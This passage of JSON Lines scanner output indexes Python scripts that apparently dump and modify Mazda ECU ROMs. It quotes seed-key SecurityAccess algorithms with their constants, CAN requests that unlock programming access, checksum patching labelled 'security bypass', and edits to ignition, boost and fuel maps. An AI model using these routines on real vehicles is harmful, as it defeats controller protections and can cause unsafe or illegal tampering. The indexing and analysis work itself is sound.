ECU ROM TO FILE\"\"\""}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "def __init__(self, rom_reader: MazdaECUROMReader):"}, {"type": "hardware", "line": 403, "hardware": "ECU", "content": "reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "print(\"  This will read entire ECU memory and save to file\")"}], "security_logic": [{"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "checksum_algorithm: str = None"}, {"type": "security_pattern", "line": 46, "pattern": "key", "content": "'security_sector': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "security_pattern", "line": 333, "pattern": "key", "content": "for sector_name in self.rom_definitions.keys():"}], "dead_or_disabled_code": [], "risks": [{"type": "security_risk", "line": 236, "risk": "eval\\(", "content": "return eval(formula)"}, {"type": "security_risk", "line": 239, "risk": "eval\\(", "content": "return eval(formula)"}, {"type": "security_risk", "line": 242, "risk": "eval\\(", "content": "return eval(formula)"}], "group_tags": ["mpsrom"]}
{"file_path": "mpsrom2.py", "lines_read": 510, "features_found": [{"type": "function", "name": "perform_advanced_rom_analysis", "line": 410}, {"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "_define_checksum_algorithms", "line": 37}, {"type": "function", "name": "_security_access_methods", "line": 66}, {"type": "function", "name": "calculate_checksum", "line": 86}, {"type": "function", "name": "_calculate_crc32", "line": 100}, {"type": "function", "name": "_calculate_crc16_ccitt", "line": 110}, {"type": "function", "name": "_calculate_sum16", "line": 120}, {"type": "function", "name": "verify_checksums", "line": 129}, {"type": "function", "name": "_read_stored_checksum", "line": 142}, {"type": "function", "name": "patch_checksum", "line": 152}, {"type": "function", "name": "_calculate_key_level1", "line": 172}, {"type": "function", "name": "_calculate_key_level2", "line": 181}, {"type": "function", "name": "_calculate_key_level3", "line": 189}, {"type": "function", "name": "security_access_ecu", "line": 197}, {"type": "function", "name": "_receive_security_response", "line": 234}, {"type": "function", "name": "__init__", "line": 247}, {"type": "function", "name": "modify_ignition_map", "line": 251}, {"type": "function", "name": "modify_boost_map", "line": 262}, {"type": "function", "name": "modify_fuel_map", "line": 271}, {"type": "function", "name": "_patch_map_in_rom", "line": 280}, {"type": "function", "name": "_convert_16x16_to_bytes", "line": 316}, {"type": "function", "name": "_convert_8x8_to_bytes", "line": 324}, {"type": "function", "name": "_convert_1d_to_bytes", "line": 332}, {"type": "function", "name": "_convert_single_to_bytes", "line": 340}, {"type": "function", "name": "__init__", "line": 348}, {"type": "function", "name": "compare_roms", "line": 351}, {"type": "function", "name": "extract_map_differences", "line": 388}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "zlib", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}], "components_found": [{"type": "class", "name": "ChecksumDefinition", "line": 19}, {"type": "class", "name": "AdvancedROMAnalyzer", "line": 29}, {"type": "class", "name": "MapModificationEngine", "line": 244}, {"type": "class", "name": "ROMComparisonTool", "line": 345}], "algorithms": [{"type": "algorithm_function", "line": 34, "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "algorithm_function", "line": 37, "content": "def _define_checksum_algorithms(self):"}, {"type": "algorithm_function", "line": 86, "content": "def calculate_checksum(self, rom_data: bytes, checksum_type: str) -> int:"}, {"type": "algorithm_function", "line": 91, "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "algorithm_function", "line": 93, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 95, "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "algorithm_function", "line": 98, "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "algorithm_function", "line": 100, "content": "def _calculate_crc32(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 110, "content": "def _calculate_crc16_ccitt(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 120, "content": "def _calculate_sum16(self, data: bytes) -> int:"}, {"type": "algorithm_function", "line": 144, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 147, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 161, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 172, "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 181, "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 189, "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}], "protocols": [{"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x010000,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x090000,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x1FFFF0,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x04C11DB7,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFFFFFF,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0xFFFFFFFF"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x000000,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x010000,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x00FFFC"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x110000,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x150000,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x14FFFC,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x1021,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFF,"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0x0000"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "'maintenance_mode': 'CAN_ID_7E0_7DF_BROADCAST_SPECIAL',"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "total = (total + value) & 0xFFFF"}, {"type": "protocol", "line": 176, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "protocol", "line": 227, "protocol": "0x[0-9A-Fa-f]+", "content": "return grant_response is not None and grant_response[1] == 0x67"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id == 0x7E8:"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "start_addr = map_info['address'] - 0x010000  # Calibration sector base"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "ADVANCED ROM ANALYSIS, CHECKSUM & SECURITY BYPASS"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "\"\"\"ADVANCED ROM ANALYSIS WITH CHECKSUM CALCULATION & SECURITY\"\"\""}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "self.rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_access = self._security_access_methods()"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "def _security_access_methods(self):"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"SECURITY ACCESS AND AUTHENTICATION METHODS\"\"\""}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "'security_modes': {"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "\"\"\"PERFORM SECURITY ACCESS TO ECU\"\"\""}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "seed_response = self._receive_security_response()"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "grant_response = self._receive_security_response()"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "print(f\"Security access failed: {e}\")"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "def _receive_security_response(self) -> Optional[bytes]:"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "\"\"\"RECEIVE SECURITY ACCESS RESPONSE\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "int_value = int(value * 10)  # Convert back to ECU format"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 417, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "print(\"\\n3. SECURITY ACCESS TEST\")"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "print(f\"  Level {level} Security Access: {'GRANTED' if access_granted else 'DENIED'}\")"}, {"type": "hardware", "line": 496, "hardware": "ECU", "content": "print(\"\\n9. SECURITY ANALYSIS\")"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "security_analysis = {"}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "'security_access': 'REQUIRED for programming operations',"}, {"type": "hardware", "line": 506, "hardware": "ECU", "content": "for aspect, status in security_analysis.items():"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 20, "pattern": "algorithm", "content": "\"\"\"CHECKSUM ALGORITHM DEFINITION\"\"\""}, {"type": "security_pattern", "line": 21, "pattern": "algorithm", "content": "algorithm: str"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "security_pattern", "line": 35, "pattern": "security_access", "content": "self.security_access = self._security_access_methods()"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "def _define_checksum_algorithms(self):"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "algorithm='CRC32',"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "algorithm='SUM16',"}, {"type": "security_pattern", "line": 56, "pattern": "algorithm", "content": "algorithm='CRC16_CCITT',"}, {"type": "security_pattern", "line": 66, "pattern": "security_access", "content": "def _security_access_methods(self):"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "seed", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "algorithm", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 70, "pattern": "algorithm", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 72, "pattern": "algorithm", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "security_pattern", "line": 93, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "security_pattern", "line": 98, "pattern": "algorithm", "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 161, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 172, "pattern": "key", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 173, "pattern": "seed", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 175, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 177, "pattern": "key", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 178, "pattern": "key", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 181, "pattern": "key", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 181, "pattern": "seed", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 182, "pattern": "key", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "seed", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "algorithm", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 184, "pattern": "seed", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 185, "pattern": "key", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 189, "pattern": "key", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 189, "pattern": "seed", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "seed", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "algorithm", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 191, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 192, "pattern": "key", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 192, "pattern": "seed", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 193, "pattern": "key", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 197, "pattern": "security_access", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "security_pattern", "line": 201, "pattern": "seed", "content": "seed_request = can.Message("}, {"type": "security_pattern", "line": 203, "pattern": "seed", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "self.rom_reader.can_bus.send(seed_request)"}, {"type": "security_pattern", "line": 209, "pattern": "seed", "content": "seed_response = self._receive_security_response()"}, {"type": "security_pattern", "line": 210, "pattern": "seed", "content": "if seed_response and len(seed_response) >= 6:"}, {"type": "security_pattern", "line": 211, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 214, "pattern": "key", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "seed", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "algorithm", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "security_access", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "seed", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "algorithm", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 218, "pattern": "key", "content": "key_request = can.Message("}, {"type": "security_pattern", "line": 220, "pattern": "key", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "security_pattern", "line": 223, "pattern": "key", "content": "self.rom_reader.can_bus.send(key_request)"}, {"type": "security_pattern", "line": 443, "pattern": "security_access", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "security_pattern", "line": 462, "pattern": "key", "content": "for checksum_type in analyzer.checksum_defs.keys():"}, {"type": "security_pattern", "line": 501, "pattern": "security_access", "content": "'security_access': 'REQUIRED for programming operations',"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mpsrom"]}
{"file_path": "mpsrom3.py", "lines_read": 510, "features_found": [{"type": "function", "name": "perform_advanced_rom_analysis", "line": 410}, {"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "_define_checksum_algorithms", "line": 37}, {"type": "function", "name": "_security_access_methods", "line": 66}, {"type": "function", "name": "calculate_checksum", "line": 86}, {"type": "function", "name": "_calculate_crc32", "line": 100}, {"type": "function", "name": "_calculate_crc16_ccitt", "line": 110}, {"type": "function", "name": "_calculate_sum16", "line": 120}, {"type": "function", "name": "verify_checksums", "line": 129}, {"type": "function", "name": "_read_stored_checksum", "line": 142}, {"type": "function", "name": "patch_checksum", "line": 152}, {"type": "function", "name": "_calculate_key_level1", "line": 172}, {"type": "function", "name": "_calculate_key_level2", "line": 181}, {"type": "function", "name": "_calculate_key_level3", "line": 189}, {"type": "function", "name": "security_access_ecu", "line": 197}, {"type": "function", "name": "_receive_security_response", "line": 234}, {"type": "function", "name": "__init__", "line": 247}, {"type": "function", "name": "modify_ignition_map", "line": 251}, {"type": "function", "name": "modify_boost_map", "line": 262}, {"type": "function", "name": "modify_fuel_map", "line": 271}, {"type": "function", "name": "_patch_map_in_rom", "line": 280}, {"type": "function", "name": "_convert_16x16_to_bytes", "line": 316}, {"type": "function", "name": "_convert_8x8_to_bytes", "line": 324}, {"type": "function", "name": "_convert_1d_to_bytes", "line": 332}, {"type": "function", "name": "_convert_single_to_bytes", "line": 340}, {"type": "function", "name": "__init__", "line": 348}, {"type": "function", "name": "compare_roms", "line": 351}, {"type": "function", "name": "extract_map_differences", "line": 388}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "zlib", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}], "components_found": [{"type": "class", "name": "ChecksumDefinition", "line": 19}, {"type": "class", "name": "AdvancedROMAnalyzer", "line": 29}, {"type": "class", "name": "MapModificationEngine", "line": 244}, {"type": "class", "name": "ROMComparisonTool", "line": 345}], "algorithms": [{"type": "algorithm_function", "line": 34, "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "algorithm_function", "line": 37, "content": "def _define_checksum_algorithms(self):"}, {"type": "algorithm_function", "line": 86, "content": "def calculate_checksum(self, rom_data: bytes, checksum_type: str) -> int:"}, {"type": "algorithm_function", "line": 91, "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "algorithm_function", "line": 93, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 95, "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "algorithm_function", "line": 98, "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "algorithm_function", "line": 100, "content": "def _calculate_crc32(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 110, "content": "def _calculate_crc16_ccitt(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 120, "content": "def _calculate_sum16(self, data: bytes) -> int:"}, {"type": "algorithm_function", "line": 144, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 147, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 161, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 172, "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 181, "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 189, "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}], "protocols": [{"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x010000,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x090000,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x1FFFF0,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x04C11DB7,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFFFFFF,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0xFFFFFFFF"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x000000,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x010000,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x00FFFC"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x110000,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x150000,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x14FFFC,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x1021,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFF,"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0x0000"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "'maintenance_mode': 'CAN_ID_7E0_7DF_BROADCAST_SPECIAL',"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "total = (total + value) & 0xFFFF"}, {"type": "protocol", "line": 176, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", 